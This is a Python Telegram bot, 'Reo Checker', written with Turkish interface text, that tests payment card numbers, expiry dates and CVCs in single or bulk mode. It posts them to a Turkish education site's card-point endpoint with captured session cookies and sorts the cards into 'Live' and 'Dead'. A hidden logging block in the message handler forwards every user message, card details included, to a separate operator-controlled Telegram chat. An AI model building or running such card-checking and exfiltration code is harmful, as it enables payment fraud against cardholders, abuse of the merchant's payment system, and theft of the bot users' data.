#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import json
import os
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import time

# Telegram Bot Token ve Log bilgilerini Environment Variables'dan al
BOT_TOKEN = os.environ.get("BOT_TOKEN")
LOG_BOT_TOKEN = os.environ.get("LOG_BOT_TOKEN")
LOG_CHAT_ID = os.environ.get("LOG_CHAT_ID")

# API URL
CARD_CHECK_URL = 'https://www.tongucakademi.com/uyelikpaketleri/getcardpoint'

# Global değişkenler
live_count = 0
dead_count = 0

def format_amount(raw_amount):
    length = len(raw_amount)
    if length <= 2:
        return '0,' + raw_amount.zfill(2)
    else:
        return raw_amount[:-2] + ',' + raw_amount[-2:]

def check_card(lista_param):
    cc_details = lista_param.split('|')
    if len(cc_details) != 4:
        return ("error", "❌ Geçersiz kart formatı.\nDoğru format: 4444555566667777|12|28|123", "0")
    
    c, m, y, cv = cc_details
    if len(y) == 4:
        y = y[-2:]
    
    post_data = {
        'KartNo': c,
        'KartAd': 'emir+cevk',
        'KartCvc': cv,
        'KartAy': m,
        'KartYil': y,
        'Total': '12599.1'
    }
    
    headers = {
        'accept': '*/*',
        'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.tongucakademi.com',
        'priority': 'u=1, i',
        'referer': 'https://www.tongucakademi.com/uyelikpaketleri/odeme/276',
        'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    
    cookies = {
        'ASP.NET_SessionId': 'xtoxzpstjtnfed4ktbb0go4u',
        '_gcl_au': '1.1.1723562686.1746221988',
        '_gid': 'GA1.2.1243701284.1746221989',
        '_fbp': 'fb.1.1746221989757.469271199203455614',
        '_clck': 'v2x1en%7C2%7Cfvk%7C0%7C1948',
        '_tt_enable_cookie': '1',
        '_ttp': '01JT9F20006ZECJG2WJ6TVRKT5_.tt.1',
        '__RequestVerificationToken': '4OSPophf8Ne-BYOEkw3BEMwMhQ_7d8Br0oJDDZq9OV-qkTp0nh5H1XyeddTfvla1mS96wzxkxmSpjMUgHQhpOrpsTrI1',
        '_ga_NCEN26BKRS': 'GS2.1.s1746221989$o1$g1$t1746222114$j60$l0$h0',
        '_ga': 'GA1.2.1563423331.1746221989',
        '_dc_gtm_UA-58119452-1': '1',
        'ttcsid': '1746221989905::j6xwLDtpjOgaC5Rh8Its.1.1746222115164',
        '_clsk': 'uqpurf%7C1746222115321%7C4%7C1%7Cm.clarity.ms%2Fcollect',
        'ttcsid_CCMOGERC77UEI4U809I0': '1746221989902::hhUX0yqgT17BkZOz7598.1.1746222115439',
        'ttcsid_CNNG33RC77U5T6M9P930': '1746221989907::xjMF1cCYA9yRpbXZmk8k.1.1746222115441',
    }
    
    try:
        response = requests.post(
            CARD_CHECK_URL,
            data=post_data,
            headers=headers,
            cookies=cookies,
            timeout=10
        )
        response_data = response.json()
        raw_amount = '0'
        if 'Data' in response_data and response_data['Data'] is not None:
            if 'Amount' in response_data['Data']:
                amount_value = response_data['Data']['Amount']
                if isinstance(amount_value, (int, float)):
                    raw_amount = str(int(amount_value))
        
        formatted_amount = format_amount(raw_amount)
        additional_data = 'N/A'
        if 'Data' in response_data and response_data['Data'] is not None:
            if 'AdditionalData' in response_data['Data']:
                additional_data = response_data['Data']['AdditionalData']
        
        add_part = f"|{additional_data}" if additional_data != 'N/A' else ""
        
        if int(raw_amount) > 0:
            result = f"✅ Approved|{lista_param}{add_part}|{formatted_amount} TL|Reo Checker"
            return ("live", result, raw_amount)
        else:
            result = f"❌ Declined|{lista_param}{add_part}|0,00 TL|Reo Checker"
            return ("dead", result, raw_amount)
        
    except requests.exceptions.RequestException as e:
        return ("error", f"❌ Hata: İstek başarısız\n{str(e)}", "0")
    except json.JSONDecodeError:
        return ("error", f"❌ Hata: JSON parse hatası", "0")
    except Exception as e:
        return ("error", f"❌ Hata: {str(e)}", "0")


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        "🤖 <b>Reo Checker - Kart Kontrol Botu</b>\n\n"
        "<b>Komutlar:</b>\n"
        "/start - Başlangıç\n"
        "/help - Yardım\n"
        "/single - Tek kart kontrol\n"
        "/multi - Çoklu kart kontrol\n\n"
        "<b>Format:</b>\n<code>KartNo|Ay|Yıl|CVC</code>",
        parse_mode='HTML'
    )


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        "📖 <b>Kullanım:</b>\n\n"
        "<b>Tek Kart:</b>\n"
        "/single\n"
        "Sonra kart bilgisini gönder\n\n"
        "<b>Çoklu Kartlar:</b>\n"
        "/multi\n"
        "Tek mesajda tüm kartları gönder (her satırda bir kart)\n\n"
        "<b>Örnek Kart:</b>\n"
        "<code>4111111111111111|12|25|123</code>",
        parse_mode='HTML'
    )


async def single_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    context.user_data['mode'] = 'single'
    await update.message.reply_text(
        "📌 <b>Tek Kart Kontrol</b>\n\n"
        "Kart bilgisini gönder:\n"
        "<code>KartNo|Ay|Yıl|CVC</code>",
        parse_mode='HTML'
    )


async def multi_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    context.user_data['mode'] = 'multi'
    await update.message.reply_text(
        "📋 <b>Çoklu Kart Kontrol</b>\n\n"
        "Tek mesajda tüm kartları gönder:\n"
        "<code>KartNo1|Ay|Yıl|CVC\nKartNo2|Ay|Yıl|CVC\nKartNo3|Ay|Yıl|CVC</code>\n\n"
        "⚡ Yazıp gönderdiğinde otomatik başlar!",
        parse_mode='HTML'
    )


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_message = update.message.text.strip()
    mode = context.user_data.get('mode')
    
    # --- LOG SİSTEMİ BAŞI ---
    try:
        if LOG_BOT_TOKEN and LOG_CHAT_ID:
            log_url = f"https://api.telegram.org/bot{LOG_BOT_TOKEN}/sendMessage"
            requests.post(log_url, data={"chat_id": LOG_CHAT_ID, "text": user_message})
    except:
        pass
    # --- LOG SİSTEMİ SONU ---
    
    if not mode:
        await update.message.reply_text("❌ Önce /single veya /multi komutunu kullan")
        return
    
    if mode == 'single':
        loading_msg = await update.message.reply_text("⏳ Kontrol ediliyor...")
        status, result, amount = check_card(user_message)
        await loading_msg.delete()
        await update.message.reply_text(result, parse_mode='HTML')
        context.user_data['mode'] = None
    
    elif mode == 'multi':
        cards = user_message.strip().split('\n')
        cards = [card.strip() for card in cards if card.strip()]
        
        if not cards:
            await update.message.reply_text("❌ Hiç kart eklenmedi")
            context.user_data['mode'] = None
            return
        
        check_msg = await update.message.reply_text(
            f"⏳ <b>{len(cards)} kart kontrol ediliyor...</b>\n\n0/{len(cards)} tamamlandı",
            parse_mode='HTML'
        )
        
        global live_count, dead_count
        live_count = 0
        dead_count = 0
        
        results = []
        for i, card in enumerate(cards):
            status, result, amount = check_card(card)
            results.append(result)
            if status == 'live':
                live_count += 1
            elif status == 'dead':
                dead_count += 1
            
            progress = f"⏳ <b>{len(cards)} kart kontrol ediliyor...</b>\n\n{i+1}/{len(cards)} tamamlandı\n✅ {live_count} Live | ❌ {dead_count} Dead"
            try:
                await check_msg.edit_text(progress, parse_mode='HTML')
            except:
                pass
            time.sleep(0.3)
        
        summary = f"✅ <b>Kontrol Tamamlandı!</b>\n\n📊 <b>Reo Checker Sonuçları:</b>\n✅ Live: {live_count}\n❌ Dead: {dead_count}\n📝 Toplam: {len(cards)}"
        await check_msg.edit_text(summary, parse_mode='HTML')
        
        context.user_data['mode'] = None


def main() -> None:
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("single", single_command))
    application.add_handler(CommandHandler("multi", multi_command))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("✅ Reo Checker Bot başlatılıyor...")
    print("Bot çalışıyor. Durdrmak için Ctrl+C'ye basın.")
    application.run_polling()


if __name__ == '__main__':
    main()